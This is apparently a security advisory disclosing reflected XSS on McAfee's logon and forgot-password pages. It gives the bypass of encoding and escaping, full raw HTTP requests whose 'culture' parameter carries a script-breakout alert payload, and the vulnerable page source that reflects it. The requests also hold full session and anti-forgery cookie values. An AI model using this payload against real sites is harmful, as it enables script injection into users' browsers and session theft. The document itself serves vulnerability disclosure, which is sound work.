Reflected XSS (Cross-Site Scripting)

Type: Unauthenticated Remote attack

We have identified that “https://logon.mcafee.com/home/login” and “https://logon.mcafee.com/Home/ForgotPassword” public web pages are vulnerable to XSS attacks. This is due to that the Web App fails to adequately sanitize request strings of malicious JavaScript. By leveraging this issue, an attacker is able to cause arbitrary HTML and Script code to be executed in a user's browser within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.

We have managed to bypass Client side protection (URL encoding), by intercepting the GET request using a HTTP proxy tool, and then replacing the encoded payload with the original one. Also, we have managed to bypass the weak Server side protection (Backslash Escaping).

Below, evidence is provided.


Original Request:
GET /home/login?redirect_uri=https%3a%2f%2fhome.mcafee.com%2fSecure%2fOAuth2CBHandler.ashx&client_id=cbe3772cdac74e42b0ea1c66d93de4bd&scope=openid+email&state=c6a3616e-be92-410b-bce9-6fdf2f98d3c9&nonce=1f2eb51d-8263-4069-aac5-f032e2a4d650&response_type=code&culture=en-us%22}%3C/script%3E%3Cscript%3Ealert(%27XSSbyIthacaLabs%27)%3C/script%3E%3Cscript%3E{%22&affid=0&mode=page&cci=b5709aad-6c52-47e2-94a5-eef47d0ec724 HTTP/1.1
Host: logon.mcafee.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _abck=3F305C13B831DAFB30A323414BCD3577~-1~YAAQnmR7XD/2XMd6AQAAC9NZ5wbWUY3mXlViCI41scdmaBSU5xzYW5ApULxg120BOteyBWDI8bBps0/v+lMAoyiSPfkUVlO6lJjVUv5oR0aDlDgCt+Dvf/GlxFXGuRvU0E/41kEuPILMFf5lgGgJ1v0pIO/31lUJZGAmRyL44sMY96f/QMj1oqBpfxN75nEYVS3BLfyvGvXDcEu0AZhrDCINpEjVUZGKn/qIUON1xnMNXeb2/3ZkidIy0WMJRQa8romhDwOvNIp6EsYrX3/hOjtxXg0f5NKO0dbJLCMNwhLnBbthSrfcN31a/hjdwFADi2lwscfXim9UhnYq/aNBFTO6UZAZaoOQvkTPcmKokirf9NJSX1gYKMR/AH1TrTbpATWLgnhBKm//DIFka3ousJ2EC1BKoaeavQ==~0~-1~-1; bm_sz=CF7B260C9A8A0881CB75AD2AD864A941~YAAQmgwVAis4S7B6AQAAbgXv5gwwovO5aXtOZbB+fwkmExk4DrFFYcgpduIVdoZPOfC7G97k5HcavYM1q6mtnFT+XHGe4R7Mvn/JQDAzFJzUYbDbLO8pRYGx81Jikf+SOcZwhcL8+xUwqpJXmhwvubJX8/N6V0hErVjOCVu4A51JoI86IYCvHNwWMd00Bdk5jlS+VGUh2kjO8zh0pdt8+/4bvK6e1H4/P03MRge0nJpiPw3sYTNwRL24aMYxP2LGJGn6OTuu2gzK5KVc8VEb7ZCcI+0UkmJlMIfsWlDsG9dq8MY=~3490616~3687238; check=true; AMCV_A729776A5245B1590A490D44%40AdobeOrg=-1124106680%7CMCIDTS%7C18836%7CMCMID%7C49997682889550462154086127059372344083%7CMCAAMLH-1627976881%7C6%7CMCAAMB-1627976881%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1627379281s%7CNONE%7CMCSYNCSOP%7C411-18843%7CvVersion%7C5.2.0; mbox=session#bd01d9d1476c4582880024d01b17c363#1627373919|PC#bd01d9d1476c4582880024d01b17c363.37_0#1690616859; AMCVS_A729776A5245B1590A490D44%40AdobeOrg=1; RT="z=1&dm=mcafee.com&si=c852d92f-704d-4bf0-8544-decfb47f7ea7&ss=krlrawc4&sl=1&tt=2o4&bcn=%2F%2F686eb51b.akstat.io%2F&ld=454&nu=dp5h8h5&cl=ij5&ul=ijk&hd=jti"; utag_main=v_id:017ae6ef0faf000d7ec9cda796060004e002700d007e8$_sn:2$_ss:0$_st:1627380859383$vapi_domain:mcafee.com$_pn:10%3Bexp-session$ses_id:1627375717479%3Bexp-session; run_fs_for_user=false; s_nr=1627379059546-Repeat; s_cc=true; _gcl_au=1.1.2126469129.1627372066; _fbp=fb.1.1627372068103.147607249; __qca=P0-638584569-1627372067375; s_sq=%5B%5BB%5D%5D; session%5Fdata=%3cSessionData%3e%0d%0a++%3ctempfrlu%3e%3c%2ftempfrlu%3e%0d%0a%3c%2fSessionData%3e; SiteID=1; langid=1; SessionInfo=AffiliateId=0; lBounceURL=http://home.mcafee.com/Secure/MyAccount/DashBoard.aspx?culture=en-us; lUsrCtxPersist=; lUsrCtxSession=%3cUserContext%3e%3cAffID%3e0%3c%2fAffID%3e%3cAffBuildID%3e0%3c%2fAffBuildID%3e%3c%2fUserContext%3e; Locale=EN-US; HPrst=gu=f154b13d-d12f-4718-b7ee-5b16456a4f2a&loc=EN-US; AffID=0-0; Currency=56; HRntm=iodtf=iq5nNK-ISQc78yUmSkAv9A2&atf=&rf=&hcof=iq5nNK-ISQc78yUmSkAv9A2&emailid=&optin=&optinvalues=&aff=0-0&cur=56&lbu=http%3a%2f%2fhome.mcafee.com%2fSecure%2fMyAccount%2fDashBoard.aspx%3fculture%3den-us&pple=iq5nNK-ISQc78yUmSkAv9A2&inur=iq5nNK-ISQc78yUmSkAv9A2&ituof=iq5nNK-ISQc78yUmSkAv9A2&ieu=iq5nNK-ISQc78yUmSkAv9A2&isr=iq5nNK-ISQc78yUmSkAv9A2&sbo=iq5nNK-ISQc78yUmSkAv9A2&om_icr=iq5nNK-ISQc78yUmSkAv9A2&om_upsa=iq5nNK-ISQc78yUmSkAv9A2&ttprdt=iq5nNK-ISQc78yUmSkAv9A2&flgn=iq5nNK-ISQc78yUmSkAv9A2&pbinfo=iq5nNK-ISQc78yUmSkAv9A2&rnwtrk=&clicksrctrk=&rqwtrk=&rqwtrkhs=&vpp=iq5nNK-ISQc78yUmSkAv9A2&mip=iq5nNK-ISQc78yUmSkAv9A2; Acpc=; Acsc=; Aksc=cntrycd=rJSNSzNfPq2yN0uILRPGAA2&city=NBDfrEKweQ_2xHQIePpwQg2&contnt=tavinROewP7H8YXhQpB2AA2&thrput=OV_vUmoBuOXyWiozJodFWg2&bw=JkwoGAMd7-X0BW_f0oaLPg2&akc=3gEkKIpaIOLle1Af1UYvBA2; CAC=0; .AspNetCore.Antiforgery.QNhT50lcuws=CfDJ8KyoVxwScfREoMCM9aKVhtb_7RqifOj1V5xOH68wuOHMOrCyNmMafPU_uVx1HwTKBb7ah_Tu-qmPaqUC6Ow4J4M8AOj3FrRavKDjiVxSsYIrq0X4mdbIDZHqUlebZMLxdH4sVk5NnHcWW4LrLP-TXQE; s_fid=1F04F57EDA5F43B4-21E33A2553035CAC; s_vi=[CS]v1|307FDD9FD660FDFA-400004E20793B373[CE]; s_gpv=%5Bconsumer%3Aweb%5D%7CUA%7Clogin; _uetsid=f7c03c20eeae11eb8a8d2b2f9567a6e2; _uetvid=f7c05a20eeae11eb8fca1bc6ebbc8506
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1



Edited Request:
GET /home/login?redirect_uri=https%3a%2f%2fhome.mcafee.com%2fSecure%2fOAuth2CBHandler.ashx&client_id=cbe3772cdac74e42b0ea1c66d93de4bd&scope=openid+email&state=c6a3616e-be92-410b-bce9-6fdf2f98d3c9&nonce=1f2eb51d-8263-4069-aac5-f032e2a4d650&response_type=code&culture=en-us"}</script><script>alert('XSSbyIthacaLabs')</script><script>{"&affid=0&mode=page&cci=b5709aad-6c52-47e2-94a5-eef47d0ec724 HTTP/1.1
Host: logon.mcafee.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _abck=3F305C13B831DAFB30A323414BCD3577~-1~YAAQnmR7XD/2XMd6AQAAC9NZ5wbWUY3mXlViCI41scdmaBSU5xzYW5ApULxg120BOteyBWDI8bBps0/v+lMAoyiSPfkUVlO6lJjVUv5oR0aDlDgCt+Dvf/GlxFXGuRvU0E/41kEuPILMFf5lgGgJ1v0pIO/31lUJZGAmRyL44sMY96f/QMj1oqBpfxN75nEYVS3BLfyvGvXDcEu0AZhrDCINpEjVUZGKn/qIUON1xnMNXeb2/3ZkidIy0WMJRQa8romhDwOvNIp6EsYrX3/hOjtxXg0f5NKO0dbJLCMNwhLnBbthSrfcN31a/hjdwFADi2lwscfXim9UhnYq/aNBFTO6UZAZaoOQvkTPcmKokirf9NJSX1gYKMR/AH1TrTbpATWLgnhBKm//DIFka3ousJ2EC1BKoaeavQ==~0~-1~-1; bm_sz=CF7B260C9A8A0881CB75AD2AD864A941~YAAQmgwVAis4S7B6AQAAbgXv5gwwovO5aXtOZbB+fwkmExk4DrFFYcgpduIVdoZPOfC7G97k5HcavYM1q6mtnFT+XHGe4R7Mvn/JQDAzFJzUYbDbLO8pRYGx81Jikf+SOcZwhcL8+xUwqpJXmhwvubJX8/N6V0hErVjOCVu4A51JoI86IYCvHNwWMd00Bdk5jlS+VGUh2kjO8zh0pdt8+/4bvK6e1H4/P03MRge0nJpiPw3sYTNwRL24aMYxP2LGJGn6OTuu2gzK5KVc8VEb7ZCcI+0UkmJlMIfsWlDsG9dq8MY=~3490616~3687238; check=true; AMCV_A729776A5245B1590A490D44%40AdobeOrg=-1124106680%7CMCIDTS%7C18836%7CMCMID%7C49997682889550462154086127059372344083%7CMCAAMLH-1627976881%7C6%7CMCAAMB-1627976881%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1627379281s%7CNONE%7CMCSYNCSOP%7C411-18843%7CvVersion%7C5.2.0; mbox=session#bd01d9d1476c4582880024d01b17c363#1627373919|PC#bd01d9d1476c4582880024d01b17c363.37_0#1690616859; AMCVS_A729776A5245B1590A490D44%40AdobeOrg=1; RT="z=1&dm=mcafee.com&si=c852d92f-704d-4bf0-8544-decfb47f7ea7&ss=krlrawc4&sl=1&tt=2o4&bcn=%2F%2F686eb51b.akstat.io%2F&ld=454&nu=dp5h8h5&cl=ij5&ul=ijk&hd=jti"; utag_main=v_id:017ae6ef0faf000d7ec9cda796060004e002700d007e8$_sn:2$_ss:0$_st:1627380859383$vapi_domain:mcafee.com$_pn:10%3Bexp-session$ses_id:1627375717479%3Bexp-session; run_fs_for_user=false; s_nr=1627379059546-Repeat; s_cc=true; _gcl_au=1.1.2126469129.1627372066; _fbp=fb.1.1627372068103.147607249; __qca=P0-638584569-1627372067375; s_sq=%5B%5BB%5D%5D; session%5Fdata=%3cSessionData%3e%0d%0a++%3ctempfrlu%3e%3c%2ftempfrlu%3e%0d%0a%3c%2fSessionData%3e; SiteID=1; langid=1; SessionInfo=AffiliateId=0; lBounceURL=http://home.mcafee.com/Secure/MyAccount/DashBoard.aspx?culture=en-us; lUsrCtxPersist=; lUsrCtxSession=%3cUserContext%3e%3cAffID%3e0%3c%2fAffID%3e%3cAffBuildID%3e0%3c%2fAffBuildID%3e%3c%2fUserContext%3e; Locale=EN-US; HPrst=gu=f154b13d-d12f-4718-b7ee-5b16456a4f2a&loc=EN-US; AffID=0-0; Currency=56; HRntm=iodtf=iq5nNK-ISQc78yUmSkAv9A2&atf=&rf=&hcof=iq5nNK-ISQc78yUmSkAv9A2&emailid=&optin=&optinvalues=&aff=0-0&cur=56&lbu=http%3a%2f%2fhome.mcafee.com%2fSecure%2fMyAccount%2fDashBoard.aspx%3fculture%3den-us&pple=iq5nNK-ISQc78yUmSkAv9A2&inur=iq5nNK-ISQc78yUmSkAv9A2&ituof=iq5nNK-ISQc78yUmSkAv9A2&ieu=iq5nNK-ISQc78yUmSkAv9A2&isr=iq5nNK-ISQc78yUmSkAv9A2&sbo=iq5nNK-ISQc78yUmSkAv9A2&om_icr=iq5nNK-ISQc78yUmSkAv9A2&om_upsa=iq5nNK-ISQc78yUmSkAv9A2&ttprdt=iq5nNK-ISQc78yUmSkAv9A2&flgn=iq5nNK-ISQc78yUmSkAv9A2&pbinfo=iq5nNK-ISQc78yUmSkAv9A2&rnwtrk=&clicksrctrk=&rqwtrk=&rqwtrkhs=&vpp=iq5nNK-ISQc78yUmSkAv9A2&mip=iq5nNK-ISQc78yUmSkAv9A2; Acpc=; Acsc=; Aksc=cntrycd=rJSNSzNfPq2yN0uILRPGAA2&city=NBDfrEKweQ_2xHQIePpwQg2&contnt=tavinROewP7H8YXhQpB2AA2&thrput=OV_vUmoBuOXyWiozJodFWg2&bw=JkwoGAMd7-X0BW_f0oaLPg2&akc=3gEkKIpaIOLle1Af1UYvBA2; CAC=0; .AspNetCore.Antiforgery.QNhT50lcuws=CfDJ8KyoVxwScfREoMCM9aKVhtb_7RqifOj1V5xOH68wuOHMOrCyNmMafPU_uVx1HwTKBb7ah_Tu-qmPaqUC6Ow4J4M8AOj3FrRavKDjiVxSsYIrq0X4mdbIDZHqUlebZMLxdH4sVk5NnHcWW4LrLP-TXQE; s_fid=1F04F57EDA5F43B4-21E33A2553035CAC; s_vi=[CS]v1|307FDD9FD660FDFA-400004E20793B373[CE]; s_gpv=%5Bconsumer%3Aweb%5D%7CUA%7Clogin; _uetsid=f7c03c20eeae11eb8a8d2b2f9567a6e2; _uetvid=f7c05a20eeae11eb8fca1bc6ebbc8506
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1


Affected Source Code:
<script type="text/javascript">
var utag_data = {"tm_global_geo":"NA","tm_global_pageurl":"http://logon.mcafee.com/home/login?redirect_uri=https%3a%2f%2fhome.mcafee.com%2fSecure%2fOAuth2CBHandler.ashx&client_id=cbe3772cdac74e42b0ea1c66d93de4bd&scope=openid+email&state=c6a3616e-be92-410b-bce9-6fdf2f98d3c9&nonce=1f2eb51d-8263-4069-aac5-f032e2a4d650&response_type=code&culture=en-us\"}</script><script>alert('XSSbyIthacaLabs')</script><script>{\"&affid=0&mode=page&cci=b5709aad-6c52-47e2-94a5-eef47d0ec724","tm_global_sourcetype":"Unified Authentication","tm_global_affiliate_name":"McAfee","tm_global_platform":"Web","tm_local_unifiedauthentication_clientid":"cbe3772cdac74e42b0ea1c66d93de4bd","tm_global_page_publish_date":"7/27/2021 2:48:38 AM","tm_global_channel":"Direct","tm_global_country":"United States","tm_global_culture_code":"EN-US","tm_global_sitesection":"login","tm_global_businessunit":"Consumer","tm_global_pagename":"[consumer:web]|UA|login","tm_global_tealium_calltype":"manual","tm_global_affiliate_id":"0","tm_global_coe":"Unified Authentication","tm_global_coe_level2":"Unified Authentication"};
</script>
